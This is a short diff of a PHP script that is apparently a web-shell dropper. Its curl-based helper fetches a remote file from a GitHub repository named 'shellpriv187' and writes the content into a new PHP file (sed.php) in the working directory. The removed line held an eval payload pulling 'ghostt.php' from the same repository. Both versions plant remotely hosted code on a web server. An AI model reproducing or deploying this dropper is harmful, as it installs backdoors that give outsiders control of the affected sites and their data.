@@ -8,9 +8,8 @@ function http_get($url){
 	return curl_exec($im);
 	curl_close($im);
 }
-$s = http_get('<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/kingfaouzizky/shellpriv187/main/ghostt.php"));?>
-');
-$check = getcwd() . "/say.php";
+$s = http_get('https://raw.githubusercontent.com/kingfaouzizky/shellpriv187/main/rizky07');
+$check = getcwd() . "/sed.php";
 $text = $s;
 $open = fopen($check, 'w');
 fwrite($open, $text);
